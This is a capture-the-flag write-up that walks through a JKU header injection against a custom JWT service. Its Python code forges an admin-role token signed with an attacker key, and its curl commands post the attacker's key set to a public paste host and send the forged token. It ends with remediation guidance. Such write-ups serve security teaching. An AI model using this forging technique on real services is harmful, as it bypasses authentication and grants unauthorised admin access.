# CTF Write-up: Bring Your Own Keys (JWKS Forge)

**Challenge:** Bring Your Own Keys
**Category:** Web / JWT Security
**Target:** `https://ch04-jwks-forge.ip-167-235-30-42.swiftwave.xyz/`
**Flag:** `FLAG{ux2j9u_skcesr_vc36js}`

---

## 1. Challenge Overview

Vantage Cloud rolled a custom JWT authentication layer for their new API. Instead of using off-the-shelf JWT middleware, they built their own solution because, in their words, "our key rotation needs are unusual." The system uses RS256-signed JWTs, and critically, **every token carries its own pointer to the public key that should verify it** via the `jku` (JWK Set URL) header parameter. This means key rotation is as simple as publishing a new key file somewhere — no server redeploys required. They also recently shipped an "avatar from URL" feature that lets users pull a profile picture from anywhere on the web.

The challenge description hints at the vulnerability clearly:

> *"Somewhere in 'the token tells the server where to find its own verification key' there's a decision that trusts something it shouldn't."*

This is a textbook **JKU (JWK Set URL) injection** vulnerability — the server trusts the `jku` header embedded inside the JWT token itself to locate the public key used for signature verification. An attacker can generate their own RSA keypair, host a JWKS containing their public key on any publicly accessible server, then forge a JWT signed with their own private key and point the `jku` header to their malicious key. The server will fetch the attacker-controlled key, successfully verify the signature (because it was genuinely signed with the matching private key), and accept all claims in the payload — including a privilege escalation to `role: "admin"`.

---

## 2. Vulnerability Background: JKU Injection

### What is JKU?

The `jku` (JWK Set URL) header parameter is defined in [RFC 7517](https://datatracker.ietf.org/doc/html/rfc7517) Section 4.4. It provides a URI that points to a JWKS (JSON Web Key Set) — a JSON document containing one or more public keys. The intended use case is key discovery: instead of hardcoding which key verifies which token, the token itself tells the verifier where to find the key. The `kid` (Key ID) header parameter is used to select the correct key within the JWKS.

A JWT header with `jku` looks like this:

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jku": "https://server.com/.well-known/jwks.json",
  "kid": "server-key-1"
}
```

### The Attack

The fundamental problem is a **trust boundary violation**. When a verifier accepts a `jku` URL from the token it is about to verify, it creates a circular trust model: the token tells the verifier which key to use to verify the token. This is logically equivalent to a person handing you a document and saying "trust this document — here's the fingerprint you should use to verify it's genuine, and I also gave you the fingerprint."

An attacker can:

1. **Generate an RSA keypair** — create their own private/public key pair.
2. **Host a JWKS** — upload a JSON file containing their public key to any URL reachable by the target server.
3. **Forge a JWT** — create a token with an escalated payload (e.g., `role: "admin"`), sign it with their private key, and set the `jku` header to point to their hosted JWKS.
4. **Submit the forged token** — the server fetches the attacker's JWKS, retrieves the public key, verifies the signature (which passes because the math is correct), and trusts the claims.

### Mitigation

The standard mitigation is to **whitelist allowed `jku` URLs** at the server level. Only specific, pre-approved domains or paths should be accepted. Additionally, the `jku` header should never be trusted blindly — the verifier should always use a pre-configured set of trusted key URLs rather than reading the URL from the token itself. The [RFC 7517 specification itself warns](https://datatracker.ietf.org/doc/html/rfc7517#section-4.4) about this risk.

---

## 3. Reconnaissance

### 3.1 Endpoint Discovery

The first step was mapping the attack surface. The challenge server is API-only (no frontend SPA, no static assets, no JavaScript files). Through systematic probing of common endpoint patterns, the following routes were discovered:

| Method | Endpoint | Status | Purpose |
|--------|----------|--------|---------|
| `POST` | `/api/signup` | 201/409/400 | User registration |
| `POST` | `/api/login` | 200/401/400 | User authentication |
| `GET` | `/admin/flag` | 401/403 | Flag endpoint (admin only) |
| `GET` | `/healthz` | 200 | Health check |
| `GET` | `/.well-known/jwks.json` | 404 | JWKS handler (returns JSON 404) |

### 3.2 Registration and Token Analysis

Registering a user was straightforward:

```bash
curl -X POST "https://ch04-jwks-forge.ip-167-235-30-42.swiftwave.xyz/api/signup" \
  -H "Content-Type: application/json" \
  -d '{"username":"ctfplayer12345","password":"ctfplayer12345"}'
```

Response (201 Created):

```json
{
  "token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHA6Ly9sb2NhbGhvc3Q6ODA4MC8ud2VsbC1rbm93bi9qd2tzLmpzb24iLCJraWQiOiJzZXJ2ZXIta2V5LTEifQ..."
}
```

Decoding the JWT revealed the critical vulnerability:

**Header:**
```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jku": "http://localhost:8080/.well-known/jwks.json",
  "kid": "server-key-1"
}
```

**Payload:**
```json
{
  "exp": 1786803605,
  "role": "user",
  "sub": "ctfplayer12345"
}
```

Two key observations:

1. The `jku` header points to `http://localhost:8080/.well-known/jwks.json` — an internal server URL. This confirms the server reads the `jku` from the token to find the verification key.
2. The payload contains a `role: "user"` claim. The target endpoint (`/admin/flag`) requires `role: "admin"`.

### 3.3 Confirming the Attack Vector

Testing the flag endpoint with a legitimate user token confirmed the authorization model:

```bash
# Without token
curl /admin/flag
# {"error":"missing bearer token"}

# With user token
curl -H "Authorization: Bearer <user_token>" /admin/flag
# {"error":"admin role required","role":"user"}
```

The server returns the current role in the error response, confirming it reads and enforces the `role` claim from the JWT payload. Privilege escalation from `user` to `admin` is all that's needed.

---

## 4. Exploitation

### 4.1 Generate Attacker Keypair

The first step was generating a fresh RSA-2048 keypair using Python's `cryptography` library:

```python
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
import base64

# Generate RSA keypair
private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
public_key = private_key.public_key()

# Extract public key components for JWKS
pub_numbers = public_key.public_numbers()

def int_to_base64url(n):
    byte_length = (n.bit_length() + 7) // 8
    n_bytes = n.to_bytes(byte_length, byteorder='big')
    return base64.urlsafe_b64encode(n_bytes).rstrip(b'=').decode('ascii')
```

### 4.2 Build and Host Malicious JWKS

A JWKS JSON file was constructed containing the attacker's public key, using the same `kid` value (`server-key-1`) as the legitimate server tokens:

```json
{
  "keys": [
    {
      "kty": "RSA",
      "use": "sig",
      "alg": "RS256",
      "kid": "server-key-1",
      "n": "<attacker_public_key_modulus_base64url>",
      "e": "AQAB"
    }
  ]
}
```

This was uploaded to a publicly accessible paste service:

```bash
curl -X POST --data-binary @jwks.json "https://paste.rs/"
# Response: https://paste.rs/FMpe1
```

The hosted JWKS was verified to be accessible and correctly formatted.

### 4.3 Forge the Admin JWT

A new JWT was forged with:

- **Header**: `jku` pointing to the attacker-controlled JWKS, `kid` matching the server's expected value
- **Payload**: `role` set to `"admin"`, with a fresh expiration timestamp
- **Signature**: RS256 signed with the attacker's private key

```python
import jwt
from datetime import datetime, timezone, timedelta

headers = {
    "alg": "RS256",
    "typ": "JWT",
    "jku": "https://paste.rs/FMpe1",
    "kid": "server-key-1"
}

payload = {
    "sub": "admin",
    "role": "admin",
    "exp": int((datetime.now(timezone.utc) + timedelta(hours=24)).timestamp())
}

forged_token = jwt.encode(payload, private_key_bytes, algorithm="RS256", headers=headers)
```

The resulting token (truncated):

```
eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vcGFzdGUucnMvRk1wZTEiLCJraWQiOiJzZXJ2ZXIta2V5LTEiLCJ0eXAiOiJKV1QifQ.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTc4Njg4NzY2MX0.i-SbyJdNEC2...
```

### 4.4 Retrieve the Flag

The forged admin JWT was sent to the flag endpoint:

```bash
curl "https://ch04-jwks-forge.ip-167-235-30-42.swiftwave.xyz/admin/flag" \
  -H "Authorization: Bearer <forged_token>"
```

Response:

```json
{"flag":"FLAG{ux2j9u_skcesr_vc36js}"}
```

The server fetched the attacker's JWKS from `https://paste.rs/FMpe1`, found the key matching `kid: "server-key-1"`, used it to verify the RS256 signature (which passed because the JWT was genuinely signed with the corresponding private key), and accepted the `role: "admin"` claim — granting access to the protected endpoint.

---

## 5. Attack Flow Diagram

The full exploit chain follows a five-phase structure:

![JKU Injection Attack Flow](attack_flow.png)

1. **Reconnaissance** — Register an account, decode the JWT, discover the `jku` header pointing to an internal URL, and identify the `/admin/flag` endpoint as the target.
2. **Key Generation** — Create a fresh RSA-2048 keypair and construct a JWKS containing the public key with the `kid` value matching the server's expectations.
3. **Host Malicious JWKS** — Upload the JWKS to a publicly accessible URL that the target server can reach.
4. **Forge Admin JWT** — Build a JWT with `role: "admin"` in the payload, sign it with the attacker's private key, and set the `jku` header to the malicious JWKS URL.
5. **Exploit** — Submit the forged token to `/admin/flag`. The server follows the `jku` pointer, retrieves the attacker's key, validates the signature, and grants admin access.

---

## 6. Remediation

This vulnerability can be prevented with several defensive measures:

### Whitelist `jku` URLs

The server should only accept `jku` values from a pre-configured allowlist of trusted domains and paths. Any token with a `jku` pointing to an unapproved domain should be immediately rejected, even before fetching the key.

```go
// Example: validate jku against whitelist
allowedJWKSOrigins := []string{
    "https://auth.vantagecloud.com",
    "https://keys.vantagecloud.com",
}
if !isAllowedOrigin(token.Header["jku"], allowedJWKSOrigins) {
    return errors.New("untrusted jku origin")
}
```

### Ignore `jku` Entirely

The simplest and most secure approach is to completely ignore the `jku` header and use a static, server-configured JWKS endpoint. Key rotation can still be achieved by updating the server's configuration file — which is the standard practice for production JWT deployments.

### Use a Trusted Key Store

Instead of dynamic key discovery via `jku`, store the verification keys in a secure, server-side configuration or a dedicated secrets manager. This removes the attacker's ability to influence which key is used for verification.

### Validate `kid` Strictly

Even with a trusted JWKS URL, the `kid` value should be validated against a list of known, active key identifiers. This prevents an attacker from adding a forged key entry to a legitimate JWKS.

---

## 7. Tools and References

| Tool/Library | Purpose |
|-------------|---------|
| `curl` | HTTP requests and endpoint enumeration |
| `pyjwt` + `cryptography` | JWT decoding, forging, and RSA key generation |
| `paste.rs` | Public JWKS hosting |
| [RFC 7517 (JWK)](https://datatracker.ietf.org/doc/html/rfc7517) | JWK Set URL specification |
| [RFC 7519 (JWT)](https://datatracker.ietf.org/doc/html/rfc7519) | JSON Web Token specification |
| [OWASP JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html) | JWT security best practices |

---

## 8. Summary

The "Bring Your Own Keys" challenge demonstrated a classic JKU injection vulnerability. The Vantage Cloud API trusted the `jku` header inside JWT tokens to determine which public key to use for signature verification, creating a circular trust model where an attacker could supply their own verification key. By generating an RSA keypair, hosting a malicious JWKS on a public paste service, and forging a JWT with an elevated `role: "admin"` claim signed by their own private key, the server was tricked into accepting the forged token as legitimate — granting unrestricted access to the admin-only flag endpoint.

The core lesson: **never trust a token to tell you which key should verify it.** Key material must always come from a trusted, server-controlled source.
